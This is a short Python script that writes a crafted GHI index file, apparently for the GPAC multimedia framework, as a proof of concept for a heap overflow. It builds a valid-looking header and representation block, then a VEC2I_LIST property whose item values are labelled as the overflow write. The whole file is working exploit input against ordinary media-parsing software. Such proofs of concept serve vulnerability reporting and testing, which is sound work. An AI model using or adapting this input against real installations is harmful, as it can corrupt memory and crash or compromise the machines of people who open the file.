import struct

def be32(x): return struct.pack(">I", x & 0xFFFFFFFF)
def be64(x): return struct.pack(">Q", x & 0xFFFFFFFFFFFFFFFF)

def create_ghi_poc(filename="poc_ghi_vec2i_list_heap_overflow.ghi"):
    out = bytearray()

    # ---- GHID header ----
    out += b"GHID"
    out += be32(1)        # version
    out += be32(1)        # segment_duration
    out += be32(1)        # max_segment_duration
    out += be64(0)        # media_presentation_duration
    out += be64(0)        # period_duration
    out += b"\x00"        # segment_template (empty utf8, null-terminated)
    out += be32(1)        # nb_reps

    # ---- rep block (must start with rep_size) ----
    rep = bytearray()
    rep += b"rep1\x00"        # rep_id
    rep += b"source.mp4\x00"  # res_url
    rep += be32(1)            # track_id
    rep += be32(0)            # first_frag_start_offset
    rep += be32(1000)         # pid_timescale
    rep += be32(1000)         # mpd_timescale
    rep += be32(0)            # bitrate
    rep += be32(0)            # delay
    rep += be32(1)            # sample_duration
    rep += be32(0)            # first_cts_offset (u32 then cast to s32)
    rep += be32(1)            # nb_segs  (sn=1 requires >=1)
    rep += struct.pack("B", 1)# starts_with_sap
    rep += struct.pack("B", 0)# rep_flags
    rep += struct.pack(">H",0)# unused

    # ---- props block: [props_size][props bytes...] ----
    props = bytearray()
    props += be32(0)          # p4cc==0 => dynamic property
    props += b"v\x00"         # pname
    props += be32(24)         # ptype == GF_PROP_VEC2I_LIST
    props += be32(1)          # nb_items
    props += be32(0xAAAAAAAA) # x
    props += be32(0xBBBBBBBB) # y  (overflow write)
    props += be32(0xFFFFFFFF) # end marker
    props_size = 4 + len(props)
    rep += be32(props_size)
    rep += props

    # ---- segment table: rep_flags=0 => 3x u32 per seg ----
    rep += be32(0)  # first_tfdt
    rep += be32(1)  # first_pck_seq (non-zero)
    rep += be32(1)  # seg_duration

    rep_size = 4 + len(rep)
    out += be32(rep_size)
    out += rep

    with open(filename, "wb") as f:
        f.write(out)
    print("written:", filename)

if __name__ == "__main__":
    create_ghi_poc()
